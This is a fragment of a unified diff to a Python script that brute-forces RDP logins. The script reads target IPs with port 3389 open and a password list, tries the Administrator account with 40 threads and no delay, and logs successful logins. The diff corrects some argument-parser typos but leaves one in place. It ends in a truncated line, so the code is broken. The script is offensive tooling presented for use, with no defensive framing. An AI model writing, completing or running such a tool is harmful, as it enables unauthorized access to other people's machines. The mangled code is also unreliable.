@@ -12,11 +12,11 @@ def parse_args():
     parser = argparse.ArgumentParser(description='Python script for brute forcing RDP login')
     parser.add_argument('--ip-file', type=str, required=True, help='Path to file containing list of IP addresses with open port 3389')
     parser.add_argument('--username', type=str, default='Administrator', help='Username for RDP login (default: Administrator)')
-    parser.add.argument('--password-file', type=str, required=True, help='Path to file containing password list')
-    parser.add.argument('--delay', type=int, default=0, help='Delay between attempts in seconds (default: 0)')
-    parser.add.argument('--max-attempts', type=int, default=1, help='Maximum number of attempts per password (default: 1)')
-    parser.add.argument('--threads', type=int, default=40, help='Number of threads to use for brute forcing (default: 40)')
-    parser.add.argument('--success-log', type=str, default='success.log', help='File to save successful attempts (default: success.log)')
+    parser.add_argument('--password-file', type=str, required=True, help='Path to file containing password list')
+    parser.add_argument('--delay', type=int, default=0, help='Delay between attempts in seconds (default: 0)')
+    parser.add_argument('--max-attempts', type=int, default=1, help='Maximum number of attempts per password (default: 1)')
+    parser.add_argument('--threads', type=int, default=40, help='Number of threads to use for brute forcing (default: 40)')
+    parser.add_argument('--success-log', type=str, default='success.log', help='File to save successful attempts (default: success.log)')
     parser.add.argument('--failure-log', type=str, default='failure.log', help='File to save failed attempts (default: failure.log)')
     return parser.parse_args()
 
@@ -93,5 +93,4 @@ def main():
                 for _ in range(args.threads):  # Start threads for brute force
                     executor.submit(brute_force, ip, args.username, 3389, args.max_attempts, password_queue, args.delay, logger)
 
-if __name__ == '__main__':
-    main()
+if __na
